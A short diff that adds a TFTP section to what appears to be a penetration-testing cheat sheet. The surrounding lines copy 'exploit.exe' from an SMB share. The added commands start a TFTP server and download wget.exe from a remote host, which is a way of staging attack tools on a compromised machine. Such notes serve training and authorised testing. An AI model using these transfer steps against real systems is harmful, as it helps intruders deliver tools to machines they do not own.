@@ -10,3 +10,9 @@ net view \\10.10.10.10
 dir \\10.10.10.10
 copy \\10.10.10.10\share\exploit.exe .
 
+# TFTP
+## Server
+atftpd --daemon --port 69 /tftp
+/etc/init.d/atftpd restart
+## Client
+tftp -i 192.160.1.101 GET wget.exe
